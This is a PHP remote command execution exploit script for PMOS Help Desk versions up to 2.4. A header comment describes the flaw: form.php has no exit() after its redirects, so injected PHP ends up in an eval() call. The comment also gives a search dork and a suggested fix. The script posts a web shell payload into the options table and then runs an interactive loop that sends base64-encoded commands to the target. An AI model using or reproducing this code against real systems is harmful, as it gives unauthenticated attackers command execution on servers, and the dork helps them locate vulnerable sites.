&lt;?php

/*
	------------------------------------------------------
	PMOS Help Desk &lt;= 2.4 Remote Command Execution Exploit
	------------------------------------------------------ 
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.h2desk.com/pmos
	dork.....: &quot;Powered by PMOS Help Desk&quot;

	[-] PHP code injection through /form.php:

	28.	if( $_SESSION[login_type] == $LOGIN_INVALID )
	29.	  Header( &quot;Location: {$HD_URL_LOGIN}?redirect=&quot; . urlencode( $HD_CURPAGE ) ); &lt;===
	30.
	31.	$global_priv = get_row_count( &quot;SELECT COUNT(*) FROM {$pre}privilege WHERE ( user_id = &#039;{$_SESSION[user][id]}&#039; &amp;&amp; dept_id = &#039;0&#039; )&quot; );
	32.	if( !$global_priv )
	33.	  Header( &quot;Location: $HD_URL_BROWSE&quot; ); &lt;===
	34.
	35.	$options = array( &quot;header&quot;, &quot;footer&quot;, &quot;logo&quot;, &quot;title&quot;, (...)
	36.
	37.	if( $_GET[cmd] == &quot;customdel&quot; )
	38.	{
	39.	  mysql_query( &quot;DELETE FROM {$pre}options WHERE ( id = &#039;{$_GET[id]}&#039; )&quot; );
	40.	}
	41.	else if( isset( $_POST[header] ) )
	42.	{
	43.	  for( $i = 0; $i &lt; count( $options ); $i++ )
	44.	  {
	45.	    $exists = get_row_count( &quot;SELECT COUNT(*) FROM {$pre}options WHERE ( name = &#039;{$options[$i]}&#039; )&quot; );
	46.	    if( $exists )
	47.	      mysql_query( &quot;UPDATE {$pre}options SET text = &#039;&quot; . $_POST[$options[$i]] . &quot;&#039; WHERE ( name = &#039;{$options[$i]}&#039; )&quot; );
	48.	    else
	49.	      mysql_query( &quot;INSERT INTO {$pre}options ( name, text ) VALUES ( &#039;{$options[$i]}&#039;, &#039;&quot; . $_POST[$options[$i]] . &quot;&#039; )&quot; ); &lt;===
	50.	  }

	there isn&#039;t any exit() or die() function after header redirection at lines 29, 33...so an attacker can inject php code into the &#039;options&#039;
	table through the query at line 49 (or 47)...injected code will be executed by eval() function located into some files...look at index.php:

	28.	$options = array( &quot;header&quot;, &quot;footer&quot;, &quot;logo&quot;, (...)
	29.	$data = get_options( $options );
	196.	  eval( &quot;?&gt; {$data[header]} &lt;?&quot; ); &lt;===

	[-] Bug fix in /form.php :

	28.	if( $_SESSION[login_type] == $LOGIN_INVALID ) {
	29.	  Header( &quot;Location: {$HD_URL_LOGIN}?redirect=&quot; . urlencode( $HD_CURPAGE ) );
	30.	  exit();
	31.	}
	32.
	33.	$global_priv = get_row_count( &quot;SELECT COUNT(*) FROM {$pre}privilege WHERE ( user_id = &#039;{$_SESSION[user][id]}&#039; &amp;&amp; dept_id = &#039;0&#039; )&quot; );
	34.	if( !$global_priv ) {
	35.	  Header( &quot;Location: $HD_URL_BROWSE&quot; );
	36.	  exit();
	37.	}
	
*/

error_reporting(0);
ini_set(&quot;default_socket_timeout&quot;, 5);
set_time_limit(0);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
		sleep(1);
	}
	fputs($sock, $packet);
	$resp = &quot;&quot;;
	while (!feof($sock)) $resp .= fread($sock, 1);
	fclose($sock);
	return $resp;
}

print &quot;\n+----------------------------------------------------------------+&quot;;
print &quot;\n| PMOS Help Desk &lt;= 2.4 Remote Command Execution Exploit by EgiX |&quot;;
print &quot;\n+----------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......:	php $argv[0] host path [options]\n&quot;;
	print &quot;\nhost.......:	target server (ip/hostname)&quot;;
	print &quot;\npath.......:	path to pmos directory (example: / or /pmos/)\n\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];
   
// try to inject php shell into &#039;header&#039; record of &#039;options&#039; table...
$data	 = &quot;header=&quot;.urlencode(&quot;&lt;?php error_reporting(0);echo __;passthru(base64_decode(\$_SERVER[HTTP_CMD]));echo __;die; ?&gt;&quot;);
$packet  = &quot;POST {$path}form.php HTTP/1.1\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet .= &quot;Keep-Alive: 300\r\n&quot;;
$packet .= &quot;Connection: keep-alive\r\n\r\n&quot;;
$packet .= $data;

http_send($host, $packet);

// ...and start the shell!
define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));
while(1)
{
	print &quot;\nxpl0it-sh3ll &gt; &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$packet  = &quot;GET {$path} HTTP/1.1\r\n&quot;;
		$packet .= &quot;Host: {$host}\r\n&quot;;
		$packet .= &quot;Cmd: &quot;.base64_encode($cmd).&quot;\r\n&quot;;
		$packet .= &quot;Keep-Alive: 300\r\n&quot;;
		$packet .= &quot;Connection: keep-alive\r\n\r\n&quot;;
		$resp = http_send($host, $packet);
		if (!strpos($resp, &quot;__&quot;)) die(&quot;\n[-] Exploit failed...\n&quot;);
		$shell = explode(&quot;__&quot;, $resp);
		print &quot;\n&quot;.$shell[1];
	}
	else break;
}

?&gt;
